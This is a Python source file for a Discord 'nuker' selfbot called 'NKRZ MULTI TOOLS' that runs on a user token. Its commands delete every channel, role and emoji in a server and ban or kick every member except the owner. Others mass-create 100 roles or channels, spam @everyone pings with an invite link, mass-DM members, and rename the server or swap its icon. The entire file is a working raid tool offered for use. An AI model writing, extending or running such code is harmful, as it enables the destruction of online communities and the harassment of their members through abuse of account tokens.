import discord
import asyncio
import aiohttp
from pystyle import Colors, Colorate

def clear():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

intents = discord.Intents.all()

async def delete_all_channels(guild):
    for channel in guild.channels:
        await channel.delete()

async def delete_all_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone":
            await role.delete()

async def delete_all_emojis(guild):
    for emoji in guild.emojis:
        await emoji.delete()

async def spam_ping(guild):
    channel = await guild.create_text_channel("nuked")

    while True:
        await channel.send("@everyone @here Ping !")
        await asyncio.sleep(5) 

async def ban_all_members(guild):
    for member in guild.members:
        if member != guild.owner:
            await member.ban(reason="Nuked by NKRZ MULTI TOOLS")
    
async def kick_all_members(guild):
    for member in guild.members:
        if member != guild.owner:
            await member.kick(reason="Nuked by NKRZ MULTI TOOLS")

async def change_guild_name(guild, new_name):
    await guild.edit(name=new_name)

async def create_roles(guild, role_name):
    for _ in range(100):
        await guild.create_role(name=role_name)

async def create_channels(guild, channel_name):
    for _ in range(100):
        await guild.create_text_channel(channel_name)

async def send_dm_all_members(guild, message):
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.send(message)
            except:
                pass

async def change_icon(guild, icon_url):
    async with aiohttp.ClientSession() as session:
        async with session.get(icon_url) as resp:
            if resp.status == 200:
                data = await resp.read()
                await guild.edit(icon=data)

async def main():
    clear()
    print(Colorate.Horizontal(Colors.blue_to_purple, "============================================="))
    print(Colorate.Horizontal(Colors.blue_to_purple, "          Discord Token User                 "))
    print(Colorate.Horizontal(Colors.blue_to_purple, "============================================="))

    token = input(Colorate.Horizontal(Colors.blue_to_cyan, "\nEnter user token: "))
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(Colorate.Horizontal(Colors.green_to_yellow, f"User {client.user} has connected."))
        activity = discord.Streaming(name="NKRZ MULTI TOOLS RAID", url="https://twitch.tv/NKRZ MULTI TOOLS")
        await client.change_presence(activity=activity)

    @client.event
    async def on_message(message):
        if message.author == client.user:
            if message.content.startswith("!delchannels"):
                await delete_all_channels(message.guild)
                await message.channel.send("All channels deleted.")

            elif message.content.startswith("!delroles"):
                await delete_all_roles(message.guild)
                await message.channel.send("All roles deleted.")

            elif message.content.startswith("!delemojis"):
                await delete_all_emojis(message.guild)
                await message.channel.send("All emojis deleted.")

            elif message.content.startswith("!spamping"):
                channel = discord.utils.get(message.guild.channels, name="nuked")
                if not channel:
                    channel = await message.guild.create_text_channel("nuked")
                for _ in range(10): 
                    await channel.send("@everyone @here https://discord.gg/HhQwbnzda2")
                await message.channel.send("Spamming ping in channel: " + channel.name)

            elif message.content.startswith("!banall"):
                await ban_all_members(message.guild)
                await message.channel.send("Banned all members.")

            elif message.content.startswith("!kickall"):
                await kick_all_members(message.guild)
                await message.channel.send("Kicked all members.")

            elif message.content.startswith("!changename"):
                new_name = message.content.split(" ", 1)[1]
                await change_guild_name(message.guild, new_name)
                await message.channel.send(f"Guild name changed to {new_name}")

            elif message.content.startswith("!createroles"):
                role_name = message.content.split(" ", 1)[1]
                await create_roles(message.guild, role_name)
                await message.channel.send(f"Created 100 roles with the name {role_name}")

            elif message.content.startswith("!createchannels"):
                channel_name = message.content.split(" ", 1)[1]
                await create_channels(message.guild, channel_name)
                await message.channel.send(f"Created 100 channels with the name {channel_name}")

            elif message.content.startswith("!senddm"):
                dm_message = message.content.split(" ", 1)[1]
                await send_dm_all_members(message.guild, dm_message)
                await message.channel.send("Sent DM to all members.")

            elif message.content.startswith("!changeicon"):
                icon_url = message.content.split(" ", 1)[1]
                await change_icon(message.guild, icon_url)
                await message.channel.send("Server icon changed.")

            elif message.content.startswith("!help"):
                help_message = """
                **List of available commands:**
                - `!delchannels`: Deletes all channels in the server.
                - `!delroles`: Deletes all roles in the server except @everyone.
                - `!delemojis`: Deletes all custom emojis in the server.
                - `!spamping`: Spams pings in a channel named 'nuked'.
                - `!banall`: Bans all members in the server.
                - `!kickall`: Kicks all members in the server.
                - `!changename [new_name]`: Changes the server name.
                - `!createroles [role_name]`: Creates 100 roles with the specified name.
                - `!createchannels [channel_name]`: Creates 100 channels with the specified name.
                - `!senddm [message]`: Sends a DM to all members with the specified message.
                - `!changeicon [icon_url]`: Changes the server icon to the image at the specified URL.
                """
                await message.channel.send(help_message)

    await client.start(token, bot=False)

if __name__ == "__main__":  
    asyncio.run(main())
